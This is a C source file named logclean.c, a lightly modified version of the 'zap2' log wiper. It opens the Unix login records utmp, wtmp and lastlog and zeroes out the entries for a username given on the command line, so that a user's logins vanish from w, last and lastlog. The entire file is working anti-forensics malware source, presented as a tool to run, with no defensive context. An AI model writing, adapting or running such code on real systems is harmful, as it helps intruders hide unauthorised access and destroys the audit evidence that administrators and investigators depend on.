/************************************************
*	logclean.c									*
*	~ Slightly modified zap2 by Acidburn		*
*												*
*	Features:									*
*	- Deletes specified username from utmp		*
*	  [w -hu username]							*
*	- Deletes specified username's last entry	*
*	  from wtmp									*
*	  [last -1 username ]						*
*	- Deletes specified username from lastlog	*
*	  [lastlog -u username]						*
************************************************/

#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/file.h>
#include <fcntl.h>
#include <utmp.h>
#include <pwd.h>
#include <lastlog.h>

#define UTMP_NAME "/var/run/utmp"
#define WTMP_NAME "/var/log/wtmp"
#define LASTLOG_NAME "/var/log/lastlog"

int f;

void kill_utmp(char *who)
{
        struct utmp utmp_ent;

        if ((f = open(UTMP_NAME, O_RDWR)) >= 0) {
          while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
                if (!strncmp(utmp_ent.ut_name, who, strlen(who))) {
                        bzero((char *)&utmp_ent, sizeof(utmp_ent));
                        lseek(f, -(sizeof(utmp_ent)), SEEK_CUR);
                        write(f, &utmp_ent, sizeof(utmp_ent));
                }
                close(f);
        }
}

void kill_wtmp(char *who)
{
        struct utmp utmp_ent;
        long pos;

        pos = 1L;
        if ((f = open(WTMP_NAME, O_RDWR)) >= 0) {
          while(pos != -1L) {
                lseek(f,-(long)((sizeof(struct utmp)) * pos),L_XTND);
                if (read (f, &utmp_ent, sizeof (struct utmp))<0) {
                        pos = -1L;
              } else {
                        if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
                             bzero((char *)&utmp_ent,sizeof(struct utmp ));
                             lseek(f, -((sizeof(struct utmp)) * pos),L_XTND);
                             write(f, &utmp_ent, sizeof (utmp_ent));
                             pos = -1L;
                        } else pos += 1L;
                }
          }
          close(f);
        }
}

void kill_lastlog(char *who)
{
        struct passwd *pwd;
        struct lastlog newll;

        if ((pwd = getpwnam(who)) != NULL) {
          if ((f = open(LASTLOG_NAME, O_RDWR)) >= 0) {
                lseek(f, (long)pwd->pw_uid * sizeof(struct lastlog), 0);
                bzero((char *)&newll, sizeof(newll));
                write(f, (char *)&newll, sizeof(newll));
                close(f);
          }
        } else printf("%s: ?\n", who);
}

int main(int argc, char *argv[])
{
        if (argc == 2) {
          kill_utmp(argv[1]);
          kill_wtmp(argv[1]);
          kill_lastlog(argv[1]);
          printf("Cleared utmp, wtmp and lastlog!\n");
          return 0;
        } else {
        printf("You must supply a username.\n");
          return 1;
        }
}
